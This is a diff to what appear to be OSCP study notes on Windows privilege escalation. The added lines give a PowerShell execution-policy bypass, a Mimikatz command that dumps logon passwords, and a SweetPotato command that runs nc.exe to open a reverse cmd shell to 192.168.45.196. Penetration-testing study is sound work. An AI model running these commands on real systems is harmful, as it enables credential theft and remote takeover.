@@ -6,11 +6,21 @@ https://github.com/itm4n/PrivescCheck
 ```
 Supposedly cleaner output than WinPEAS
 
-## WinPEAS
+## PrivescCheck (Run)
+```
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+```
+
+## WinPEAS (Source)
 ```
 https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
 ```
 Fundamental for OSCP. Always run and read output thoroughly.
+
+## WinPEAS (Kali Source)
+```
+/usr/share/peass/winpeas/winPEASx64.exe
+```
 
 ## PowerShell Tee 
 Useful for running WinPEAS -- writes output to file while allowing real-time review.
@@ -19,7 +29,8 @@ Useful for running WinPEAS -- writes output to file while allowing real-time rev
 ```
 # Helpers
 Somewhere in between manual and automated tooling.
-## PowerUp.ps1
+
+## PowerUp.ps1 (Source)
 ```
 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
 ```
@@ -156,6 +167,11 @@ cmdkey /list
 ```
 
 # Credential Harvesting (Requires local admin)
+## Mimikatz (Kali Source)
+```
+/usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+```
+
 ## Run Mimikatz to extract logon passwords
 ```cmd
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
@@ -286,13 +302,20 @@ icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 	- Try Sweet Potato first (stabler than GodPotato)
 
 ## SweetPotato (Source)
+First choice to due to coverage of wide range of Windows versions.
 ```
 https://github.com/CCob/SweetPotato
 ```
 
 ## Run SweetPotato for privilege escalation
 ```cmd
-.\SweetPotato.exe -p c:\windows\system32\cmd.exe -a "/c whoami"
+.\SweetPotato.exe -p .\nc.exe -a "192.168.45.196 4440 -e cmd.exe"
+```
+
+
+## Rogue Potato (Source). For >= Windows 10 1809 & Windows Server 2019
+```
+https://github.com/antonioCoco/RoguePotato
 ```
 
 
